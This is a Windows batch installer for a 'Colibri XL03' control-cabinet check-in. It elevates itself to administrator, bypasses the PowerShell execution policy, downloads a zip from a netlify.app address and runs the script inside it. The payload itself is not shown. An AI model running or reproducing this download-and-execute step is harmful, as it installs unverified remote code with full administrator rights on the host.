@echo off
title Colibri XL03 - install check-in (one file)
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo Asking for administrator permission...
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)
echo.
echo Downloading and installing the Colibri check-in for Colibri XL03...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; $ErrorActionPreference='Stop'; try { $z=Join-Path $env:TEMP 'colibri-xl03.zip'; $d=Join-Path $env:TEMP 'colibri-xl03'; Invoke-WebRequest 'https://tangerine-smakager-bdebcf.netlify.app/downloads/Colibri-XL03-checkin.zip' -OutFile $z -UseBasicParsing; Expand-Archive $z $d -Force; & (Join-Path $d 'colibri-checkin.ps1') -Install -Unit 'Colibri XL03' -Role 'Control cabinet' } catch { Write-Host ('FAILED: ' + $_.Exception.Message) -ForegroundColor Red }"
echo.
echo Status page: https://tangerine-smakager-bdebcf.netlify.app/colibri-status.html
echo.
pause
